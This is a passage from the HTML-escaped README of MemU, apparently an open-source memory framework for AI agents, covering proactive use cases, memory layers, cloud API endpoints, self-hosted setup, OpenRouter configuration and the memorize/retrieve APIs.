‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  3. RESPOND TO USER              ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  3. PREDICT USER INTENT                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Deliver answer/result        ‚îÇ  ‚îÇ   ‚îÄ‚îÄ‚îÄ‚ñ∫  ‚îÇ  ‚îÇ     Anticipate next steps                ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Continue conversation        ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ     Identify upcoming needs              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ                 ‚îÇ                      ‚îÇ         ‚îÇ                    ‚îÇ                           ‚îÇ
‚îÇ                 ‚ñº                      ‚îÇ         ‚îÇ                    ‚ñº                           ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ         ‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ  4. LOOP                         ‚îÇ  ‚îÇ         ‚îÇ  ‚îÇ  4. RUN PROACTIVE TASKS                  ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     Wait for next user input     ‚îÇ  ‚îÇ   ‚óÑ‚îÄ‚îÄ‚îÄ  ‚îÇ  ‚îÇ     Pre-fetch relevant context           ‚îÇ  ‚îÇ
‚îÇ  ‚îÇ     or proactive suggestions     ‚îÇ  ‚îÇ  suggest‚îÇ  ‚îÇ     Prepare recommendations              ‚îÇ  ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ         ‚îÇ  ‚îÇ     Update todolist autonomously         ‚îÇ  ‚îÇ
‚îÇ                                        ‚îÇ         ‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò         ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                 ‚îÇ                                                           ‚îÇ
                 ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                                             ‚ñº
                              ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
                              ‚îÇ     CONTINUOUS SYNC LOOP     ‚îÇ
                              ‚îÇ  Agent ‚óÑ‚îÄ‚îÄ‚ñ∫ MemU Bot ‚óÑ‚îÄ‚îÄ‚ñ∫ DB ‚îÇ
                              ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üéØ Proactive Use Cases&lt;/h2&gt; 
&lt;h3&gt;1. &lt;strong&gt;Information Recommendation&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent monitors interests and proactively surfaces relevant content&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# User has been researching AI topics
MemU tracks: reading history, saved articles, search queries

# When new content arrives:
Agent: "I found 3 new papers on RAG optimization that align with
        your recent research on retrieval systems. One author
        (Dr. Chen) you've cited before published yesterday."

# Proactive behaviors:
- Learns topic preferences from browsing patterns
- Tracks author/source credibility preferences
- Filters noise based on engagement history
- Times recommendations for optimal attention
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;2. &lt;strong&gt;Email Management&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent learns communication patterns and handles routine correspondence&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# MemU observes email patterns over time:
- Response templates for common scenarios
- Priority contacts and urgent keywords
- Scheduling preferences and availability
- Writing style and tone variations

# Proactive email assistance:
Agent: "You have 12 new emails. I've drafted responses for 3 routine
        requests and flagged 2 urgent items from your priority contacts.
        Should I also reschedule tomorrow's meeting based on the
        conflict John mentioned?"

# Autonomous actions:
‚úì Draft context-aware replies
‚úì Categorize and prioritize inbox
‚úì Detect scheduling conflicts
‚úì Summarize long threads with key decisions
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;3. &lt;strong&gt;Trading &amp;amp; Financial Monitoring&lt;/strong&gt;&lt;/h3&gt; 
&lt;p&gt;&lt;em&gt;Agent tracks market context and user investment behavior&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# MemU learns trading preferences:
- Risk tolerance from historical decisions
- Preferred sectors and asset classes
- Response patterns to market events
- Portfolio rebalancing triggers

# Proactive alerts:
Agent: "NVDA dropped 5% in after-hours trading. Based on your past
        behavior, you typically buy tech dips above 3%. Your current
        allocation allows for $2,000 additional exposure while
        maintaining your 70/30 equity-bond target."

# Continuous monitoring:
- Track price alerts tied to user-defined thresholds
- Correlate news events with portfolio impact
- Learn from executed vs. ignored recommendations
- Anticipate tax-loss harvesting opportunities
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;...&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üóÇÔ∏è Hierarchical Memory Architecture&lt;/h2&gt; 
&lt;p&gt;MemU's three-layer system enables both &lt;strong&gt;reactive queries&lt;/strong&gt; and &lt;strong&gt;proactive context loading&lt;/strong&gt;:&lt;/p&gt; 
&lt;img width="100%" alt="structure" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/structure.png" /&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Layer&lt;/th&gt; 
   &lt;th&gt;Reactive Use&lt;/th&gt; 
   &lt;th&gt;Proactive Use&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Resource&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Direct access to original data&lt;/td&gt; 
   &lt;td&gt;Background monitoring for new patterns&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Item&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Targeted fact retrieval&lt;/td&gt; 
   &lt;td&gt;Real-time extraction from ongoing interactions&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Summary-level overview&lt;/td&gt; 
   &lt;td&gt;Automatic context assembly for anticipation&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Benefits:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Auto-categorization&lt;/strong&gt;: New memories self-organize into topics&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Pattern Detection&lt;/strong&gt;: System identifies recurring themes&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Context Prediction&lt;/strong&gt;: Anticipates what information will be needed next&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üöÄ Quick Start&lt;/h2&gt; 
&lt;h3&gt;Option 1: Cloud Version&lt;/h3&gt; 
&lt;p&gt;Experience proactive memory instantly:&lt;/p&gt; 
&lt;p&gt;üëâ &lt;strong&gt;&lt;a href="https://memu.so"&gt;memu.so&lt;/a&gt;&lt;/strong&gt; - Hosted service with 7√ó24 continuous learning&lt;/p&gt; 
&lt;p&gt;For enterprise deployment with custom proactive workflows, contact &lt;strong&gt;&lt;a href="mailto:info@nevamind.ai"&gt;info@nevamind.ai&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;h4&gt;Cloud API (v3)&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Base URL&lt;/th&gt; 
   &lt;th&gt;&lt;code&gt;https://api.memu.so&lt;/code&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Auth&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;Authorization: Bearer YOUR_API_KEY&lt;/code&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Method&lt;/th&gt; 
   &lt;th&gt;Endpoint&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/memorize&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Register continuous learning task&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;GET&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/memorize/status/{task_id}&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Check real-time processing status&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/categories&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;List auto-generated categories&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;POST&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;code&gt;/api/v3/memory/retrieve&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Query memory (supports proactive context loading)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;üìö &lt;strong&gt;&lt;a href="https://memu.pro/docs#cloud-version"&gt;Full API Documentation&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Option 2: Self-Hosted&lt;/h3&gt; 
&lt;h4&gt;Installation&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install -e .
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Basic Example&lt;/h4&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;&lt;strong&gt;Requirements&lt;/strong&gt;: Python 3.13+ and an OpenAI API key&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;Test Continuous Learning&lt;/strong&gt; (in-memory):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
cd tests
python test_inmemory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Test with Persistent Storage&lt;/strong&gt; (PostgreSQL):&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;# Start PostgreSQL with pgvector
docker run -d \
  --name memu-postgres \
  -e POSTGRES_USER=postgres \
  -e POSTGRES_PASSWORD=postgres \
  -e POSTGRES_DB=memu \
  -p 5432:5432 \
  pgvector/pgvector:pg16

# Run continuous learning test
export OPENAI_API_KEY=your_api_key
cd tests
python test_postgres.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Both examples demonstrate &lt;strong&gt;proactive memory workflows&lt;/strong&gt;:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Continuous Ingestion&lt;/strong&gt;: Process multiple files sequentially&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Auto-Extraction&lt;/strong&gt;: Immediate memory creation&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Proactive Retrieval&lt;/strong&gt;: Context-aware memory surfacing&lt;/li&gt; 
&lt;/ol&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/tests/test_inmemory.py"&gt;&lt;code&gt;tests/test_inmemory.py&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/tests/test_postgres.py"&gt;&lt;code&gt;tests/test_postgres.py&lt;/code&gt;&lt;/a&gt; for implementation details.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h3&gt;Custom LLM and Embedding Providers&lt;/h3&gt; 
&lt;p&gt;MemU supports custom LLM and embedding providers beyond OpenAI. Configure them via &lt;code&gt;llm_profiles&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from memu import MemUService

service = MemUService(
    llm_profiles={
        # Default profile for LLM operations
        "default": {
            "base_url": "https://dashscope.aliyuncs.com/compatible-mode/v1",
            "api_key": "your_api_key",
            "chat_model": "qwen3-max",
            "client_backend": "sdk"  # "sdk" or "http"
        },
        # Separate profile for embeddings
        "embedding": {
            "base_url": "https://api.voyageai.com/v1",
            "api_key": "your_voyage_api_key",
            "embed_model": "voyage-3.5-lite"
        }
    },
    # ... other configuration
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;h3&gt;OpenRouter Integration&lt;/h3&gt; 
&lt;p&gt;MemU supports &lt;a href="https://openrouter.ai"&gt;OpenRouter&lt;/a&gt; as a model provider, giving you access to multiple LLM providers through a single API.&lt;/p&gt; 
&lt;h4&gt;Configuration&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from memu import MemoryService

service = MemoryService(
    llm_profiles={
        "default": {
            "provider": "openrouter",
            "client_backend": "httpx",
            "base_url": "https://openrouter.ai",
            "api_key": "your_openrouter_api_key",
            "chat_model": "anthropic/claude-3.5-sonnet",  # Any OpenRouter model
            "embed_model": "openai/text-embedding-3-small",  # Embedding model
        },
    },
    database_config={
        "metadata_store": {"provider": "inmemory"},
    },
)
&lt;/code&gt;&lt;/pre&gt; 
&lt;h4&gt;Environment Variables&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Variable&lt;/th&gt; 
   &lt;th&gt;Description&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;code&gt;OPENROUTER_API_KEY&lt;/code&gt;&lt;/td&gt; 
   &lt;td&gt;Your OpenRouter API key from &lt;a href="https://openrouter.ai/keys"&gt;openrouter.ai/keys&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Supported Features&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Feature&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
   &lt;th&gt;Notes&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Chat Completions&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Works with any OpenRouter chat model&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Embeddings&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Use OpenAI embedding models via OpenRouter&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Vision&lt;/td&gt; 
   &lt;td&gt;Supported&lt;/td&gt; 
   &lt;td&gt;Use vision-capable models (e.g., &lt;code&gt;openai/gpt-4o&lt;/code&gt;)&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Running OpenRouter Tests&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENROUTER_API_KEY=your_api_key

# Full workflow test (memorize + retrieve)
python tests/test_openrouter.py

# Embedding-specific tests
python tests/test_openrouter_embedding.py

# Vision-specific tests
python tests/test_openrouter_vision.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;See &lt;a href="https://raw.githubusercontent.com/NevaMind-AI/memU/main/examples/example_4_openrouter_memory.py"&gt;&lt;code&gt;examples/example_4_openrouter_memory.py&lt;/code&gt;&lt;/a&gt; for a complete working example.&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üìñ Core APIs&lt;/h2&gt; 
&lt;h3&gt;&lt;code&gt;memorize()&lt;/code&gt; - Continuous Learning Pipeline&lt;/h3&gt; 
&lt;p&gt;Processes inputs in real-time and immediately updates memory:&lt;/p&gt; 
&lt;img width="100%" alt="memorize" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/memorize.png" /&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;result = await service.memorize(
    resource_url="path/to/file.json",  # File path or URL
    modality="conversation",            # conversation | document | image | video | audio
    user={"user_id": "123"}             # Optional: scope to a user
)

# Returns immediately with extracted memory:
{
    "resource": {...},      # Stored resource metadata
    "items": [...],         # Extracted memory items (available instantly)
    "categories": [...]     # Auto-updated category structure
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Features:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Zero-delay processing‚Äîmemories available immediately&lt;/li&gt; 
 &lt;li&gt;Automatic categorization without manual tagging&lt;/li&gt; 
 &lt;li&gt;Cross-reference with existing memories for pattern detection&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;&lt;code&gt;retrieve()&lt;/code&gt; - Dual-Mode Intelligence&lt;/h3&gt; 
&lt;p&gt;MemU supports both &lt;strong&gt;proactive context loading&lt;/strong&gt; and &lt;strong&gt;reactive querying&lt;/strong&gt;:&lt;/p&gt; 
&lt;img width="100%" alt="retrieve" src="https://raw.githubusercontent.com/NevaMind-AI/memU/main/assets/retrieve.png" /&gt; 
&lt;h4&gt;RAG-based Retrieval (&lt;code&gt;method="rag"&lt;/code&gt;)&lt;/h4&gt; 
&lt;p&gt;Fast &lt;strong&gt;proactive context assembly&lt;/strong&gt; using embeddings:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Instant context&lt;/strong&gt;: Sub-second memory surfacing&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Background monitoring&lt;/strong&gt;: Can run continuously without LLM costs&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Similarity scoring&lt;/strong&gt;: Identifies most relevant memories automatically&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;LLM-based Retrieval (&lt;code&gt;method="llm"&lt;/code&gt;)&lt;/h4&gt; 
&lt;p&gt;Deep &lt;strong&gt;anticipatory reasoning&lt;/strong&gt; for complex contexts:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Intent prediction&lt;/strong&gt;: LLM infers what user needs before they ask&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Query evolution&lt;/strong&gt;: Automatically refines search as context develops&lt;/li&gt; 
 &lt;li&gt;‚úÖ &lt;strong&gt;Early termination&lt;/strong&gt;: Stops when sufficient context is gathered&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h4&gt;Comparison&lt;/h4&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Aspect&lt;/th&gt; 
   &lt;th&gt;RAG (Fast Context)&lt;/th&gt; 
   &lt;th&gt;LLM (Deep Reasoning)&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Speed&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;‚ö° Milliseconds&lt;/td&gt; 
   &lt;td&gt;üê¢ Seconds&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Cost&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;üí∞ Embedding only&lt;/td&gt; 
   &lt;td&gt;üí∞üí∞ LLM inference&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Proactive use&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Continuous monitoring&lt;/td&gt; 
   &lt;td&gt;Triggered context loading&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;strong&gt;Best for&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;Real-time suggestions&lt;/td&gt; 
   &lt;td&gt;Complex anticipation&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h4&gt;Usage&lt;/h4&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;# Proactive retrieval with context history
result = await service.retrieve(
    queries=[
        {"role": "user", "content": {"text": "What are their preferences?"}},
        {"role": "user", "content": {"text": "Tell me about work habits"}}
    ],
    where={"user_id": "123"},  # Optional: scope filter
    method="rag"  # or "llm" for deeper reasoning
)

# Returns context-aware results:
{
    "categories": [...],     # Relevant topic areas (auto-prioritized)
    "items": [...],          # Specific memory facts
    "resources": [...],      # Original sources for traceability
    "next_step_query": "..." # Predicted follow-up context
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Filtering&lt;/strong&gt;: Use &lt;code&gt;where&lt;/code&gt; to scope continuous monitoring:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;where={"user_id": "123"}&lt;/code&gt; - User-specific context&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;where={"agent_id__in": ["1", "2"]}&lt;/code&gt; - Multi-agent coordination&lt;/li&gt; 
 &lt;li&gt;Omit &lt;code&gt;where&lt;/code&gt; for global context awareness&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üí° Proactive Scenarios&lt;/h2&gt; 
&lt;h3&gt;Example 1: Always-Learning Assistant&lt;/h3&gt; 
&lt;p&gt;Continuously learns from every interaction without explicit memory commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;export OPENAI_API_KEY=your_api_key
python examples/example_1_conversation_memory.py
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Proactive Behavior:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
